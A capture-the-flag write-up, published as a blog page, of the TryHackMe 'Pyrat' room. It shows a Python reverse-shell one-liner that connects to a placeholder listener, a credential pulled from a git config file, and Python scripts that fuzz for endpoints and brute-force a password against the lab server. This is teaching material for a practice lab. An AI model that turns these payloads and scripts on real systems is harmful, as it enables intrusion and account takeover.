@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>THM - Pyrat :: squ4r00t</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Easy&#39; room: Pyrat" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/thm-pyrat/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="THM - Pyrat">
+<meta property="og:description" content="Writeup for the &#39;Easy&#39; room: Pyrat" />
+<meta property="og:url" content="//localhost:1313/posts/thm-pyrat/" />
+<meta property="og:site_name" content="squ4r00t" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/img/thm/pyrat/pyrat.webp">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-10-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &lt; squ4r00t &gt;
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">$ whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/whoami" >$ whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/thm-pyrat/">THM - Pyrat</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-10-09</time><span class="post-author">squ4r00t</span>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+    </span>
+  
+  
+    
+    <img src="//localhost:1313/img/thm/pyrat/pyrat.webp"
+      class="post-cover"
+      alt=" "
+      title="Cover Image" />
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Pyrat is an “Easy” room where we encounter a rather “unusual” python HTTP server returning a curious response. With more testing, we realise that it is vulnerable to Python code execution which gives us foothold into the box. After some exploration, we find files that help us better understand how the Python server work and with some fuzzing with a custom script we finally get root access.</p>
+<h2 id="nmap-results">Nmap Results<a href="#nmap-results" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span></code></pre></div><p>We have 2 ports open:</p>
+<ul>
+<li>22 for ssh</li>
+<li>8000 for a Python Http server</li>
+</ul>
+<h2 id="python-http-server">Python HTTP Server<a href="#python-http-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/try_more_basic.webp"   />
+    
+      <figcaption class="center" >Home Page</figcaption>
+    
+  </figure>
+
+
+<p>Let’s try it with curl too:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://10.10.167.212:8000 -i
+</span></span></code></pre></div>
+  <figure class="center" >
+    <img src="/img/thm/pyrat/try_with_curl.webp"   />
+    
+      <figcaption class="center" >Using curl</figcaption>
+    
+  </figure>
+
+
+<p>We can see in the response headers that the server is <code>SimpleHTTP/0.6 Python/3.11.2</code> and the response body is the same as before: &ldquo;Try a more basic connection.&rdquo;</p>
+<p>Seeing this, what comes in mind is to try connecting via netcat as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc 10.10.167.212 <span class="m">8000</span>
+</span></span></code></pre></div><p>With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/py_code_exec.webp"   />
+    
+      <figcaption class="center" >Python Code Execution</figcaption>
+    
+  </figure>
+
+
+<p>We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><blockquote>
+<p>Don’t forget to replace <code>&lt;LHOST&gt;</code> and <code>&lt;LPORT&gt;</code> with the IP and Port of your listener.</p></blockquote>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/rev_shell.webp"   />
+    
+      <figcaption class="center" >Reverse shell</figcaption>
+    
+  </figure>
+
+
+<p>We got a shell back!</p>
+<h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h3 id="www-data---think">www-data -&gt; think<a href="#www-data---think" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>After some exploration, we stumble upon an interesting folder at <code>/opt/dev</code>. Listing the contents of this folder we see that it’s a git repository.</p>
+<p>When we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/dubious_ownership_git.webp"   />
+    
+      <figcaption class="center" >Dubious ownership of the repository</figcaption>
+    
+  </figure>
+
+
+<p>We can see that the user <code>think</code> is the owner of this repo.</p>
+<p>With further digging, we find a password inside <code>/opt/dev/.git/config</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/think_user_password.webp"   />
+    
+      <figcaption class="center" >think's password found in /opt/dev/.git/config</figcaption>
+    
+  </figure>
+
+
+<p>If we try this password with ssh, we are able to login to the machine as think and get the user flag at <code>/home/think/user.txt</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/user_flag.webp"   />
+    
+      <figcaption class="center" >User flag obtained !</figcaption>
+    
+  </figure>
+
+
+<h3 id="think---root">think -&gt; root<a href="#think---root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Now that we have a shell as think, let’s see what was in that git repository.</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/git_status.webp"   />
+    
+      <figcaption class="center" >Running git status</figcaption>
+    
+  </figure>
+
+
+<p>We can see that there was a file named <code>pyrat.py.old</code>.</p>
+<p>After restoring it with <code>git restore pyrat.py.old</code>, we get the following python script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...............................................</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">switch_case</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s1">&#39;some_endpoint&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">get_this_enpoint</span><span class="p">(</span><span class="n">client_socket</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Check socket is admin and downgrade if is not aprooved</span>
+</span></span><span class="line"><span class="cl">        <span class="n">uid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getuid</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">change_uid</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s1">&#39;shell&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">shell</span><span class="p">(</span><span class="n">client_socket</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exec_python</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">client_socket</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">pty</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">client_socket</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">client_socket</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">client_socket</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">e</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...............................................</span>
+</span></span></code></pre></div><p>Reading the code, we see that the application will behave differently based on the data provided to it. Additionally, if we read the description of the room:</p>
+<blockquote>
+<p>A subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint</p></blockquote>
+<p>We can infer that there is another endpoint ( like <code>shell</code> ) and we are supposed to fuzz the server in order to find it.</p>
+<p>But before that, let’s see how the server behaves when it is provided a valid endpoint vs when it is given an invalid endpoint.</p>
+<p>For the valid endpoint, let’s just try <code>shell</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/valid_endpoint.webp"   />
+    
+      <figcaption class="center" >Trying shell</figcaption>
+    
+  </figure>
+
+
+<p>We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (<code>invalid123</code>):</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/invalid_endpoint.webp"   />
+    
+      <figcaption class="center" >Trying an invalid endpoint</figcaption>
+    
+  </figure>
+
+
+<p>We get the message: “<code>name ‘invalid123’ is not defined</code>”.</p>
+<p>Now we have enough information to write a script that will help us discover new endpoints.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="814765329" type="checkbox"  />
+    <label for="814765329">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">Fuzzing for other endpoints</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import socket
+
+# Defining variables
+RHOST = &#34;10.10.137.243&#34;
+RPORT = 8000
+WORDLIST_PATH = &#34;/usr/share/wordlists/dirb/common.txt&#34;
+
+# Creating a socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Setting a timeout for the socket (2 seconds)
+s.settimeout(2)
+
+# Connecting to the server
+s.connect((RHOST, RPORT))
+
+# Opening the wordlist file in &#34;read&#34; mode
+wlist = open(WORDLIST_PATH, &#34;r&#34;)
+
+for endpoint in wlist:
+    print(f&#34;[i] Trying {endpoint.strip()}&#34;)
+    try:
+        s.sendall(endpoint.strip().encode())
+        response = s.recv(1024).decode()
+        if &#34;is not defined&#34; not in response and &#34;&lt;string&gt;&#34; not in response and response.strip() != &#34;&#34;:
+            print(f&#34;[&#43;] {endpoint.strip()} might be a valid endpoint. It returned: {response}&#34;)
+            choice = input(&#34;Continue? [y/n] -&gt; &#34;)
+            if choice != &#34;y&#34;:
+                exit(0)
+    except socket.timeout:
+        print(f&#34;[!] Timeout for {endpoint.strip()}&#34;)
+        continue
+
+wlist.close()
+</code></pre>
+  </div>
+
+
+<p>This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the <code>WORDLIST_PATH</code> variable) and send each of the word to the server. If the response from the server fulfills the following criteria:</p>
+<ul>
+<li>Does not contain &ldquo;is not defined&rdquo; : This is the response we got earlier for an invalid endpoint</li>
+<li>Does not contain &ldquo;<code>&lt;string&gt;</code>&rdquo; : For some words, the server will return and error usually containing &ldquo;<code>&lt;string&gt;</code>&rdquo;</li>
+<li>Is not empty</li>
+</ul>
+<p>It is considered a potential valid endpoint and the script prompt us if we want to continue or not.</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/endpoint_fuzz_script.webp"   />
+    
+      <figcaption class="center" >Running the script</figcaption>
+    
+  </figure>
+
+
+<p>After running the script, we eventually get the right endpoint. Let’s try it!</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/entering_valid_endpoint.webp"   />
+    
+      <figcaption class="center" >Trying the valid endpoint</figcaption>
+    
+  </figure>
+
+
+<p>We are prompted for a password…</p>
+<p>If we go back to the room’s description:</p>
+<blockquote>
+<p>Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.</p></blockquote>
+<p>We see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/3_wrong_pass.webp"   />
+    
+      <figcaption class="center" >Trying invalid passwords</figcaption>
+    
+  </figure>
+
+
+<p>We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/re_enter_valid_endpoint.webp"   />
+    
+      <figcaption class="center" >After re-entering the valid endpoint</figcaption>
+    
+  </figure>
+
+
+<p>After re-entering the valid endpoint, we get prompted for the password again…</p>
+<p>So our script has to send the valid endpoint, try 3 passwords, send the valid endpoint, try 3 passwords, so on and so forth.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="652981374" type="checkbox"  />
+    <label for="652981374">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">Password Brute-Force</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import socket
+import time
+import os
+
+# Defining variables
+RHOST = &#34;10.10.137.243&#34;
+RPORT = 8000
+WORDLIST_PATH = &#34;/opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt&#34;
+
+# Connecting to socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3.0)
+s.connect((RHOST, RPORT))
+
+# Opening the wordlist file
+wlist = open(WORDLIST_PATH, &#34;r&#34;)
+
+# Creating temporary wordlist
+temp_wlist = open(&#34;/tmp/tmp_wlist&#34;, &#34;a&#34;)
+for index, password in enumerate(wlist):
+    if index % 3 == 0:
+        temp_wlist.write(&#34;&lt;REDACTED&gt;\n&#34;)
+    temp_wlist.write(password)
+
+# Closing wordlist files
+wlist.close()
+temp_wlist.close()
+
+# Looping through temporary wordlist file
+temp_wlist = open(&#34;/tmp/tmp_wlist&#34;, &#34;r&#34;)
+for line in temp_wlist.readlines():
+    time.sleep(0.5)
+    print(f&#34;[i] Trying {line.strip()}&#34;)
+    try:
+        s.sendall(line.strip().encode())
+        response = s.recv(1024).decode()
+
+        if response != &#34;Password:\n&#34;:
+            print(f&#34;[&#43;] {line.strip()} might be the password. It returned: {response}&#34;)
+            choice = input(&#34;Continue? [y/n] -&gt; &#34;)
+            if choice != &#34;y&#34;:
+                exit(0)
+    except socket.timeout:
+        print(&#34;[-] Response timeout!&#34;)
+        continue
+
+# Closing temporary wordlist file
+temp_wlist.close()
+
+# Deleting temporary file
+os.system(&#34;rm /tmp/tmp_wlist&#34;)
+</code></pre>
+  </div>
+
+
+<p>This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the <code>WORDLIST_PATH</code> variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:</p>
+<p><strong>Original wordlist</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">pass1
+</span></span><span class="line"><span class="cl">pass2
+</span></span><span class="line"><span class="cl">pass3
+</span></span><span class="line"><span class="cl">pass4
+</span></span><span class="line"><span class="cl">pass5
+</span></span></code></pre></div><p><strong>Temporary wordlist</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">pass1
+</span></span><span class="line"><span class="cl">pass2
+</span></span><span class="line"><span class="cl">pass3
+</span></span><span class="line"><span class="cl">&lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">pass4
+</span></span><span class="line"><span class="cl">pass5
+</span></span></code></pre></div><p>Here <code>&lt;REDACTED&gt;</code> being the valid endpoint.</p>
+<p>If we run the script:</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/brute_force_script.webp"   />
+    
+      <figcaption class="center" >Running the script</figcaption>
+    
+  </figure>
+
+
+<p>Well, looks like we got it…</p>
+
+  <figure class="center" >
+    <img src="/img/thm/pyrat/root_flag.webp"   />
+    
+      <figcaption class="center" >Root flag obtained !</figcaption>
+    
+  </figure>
+
+
+<p>We spawn a shell as root and get the root flag at <code>/root/root.txt</code>.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/portswigger-modifying-serial-obj/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Modifying Serialized Objects</span>
+            </a>
+        </span>
+        
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
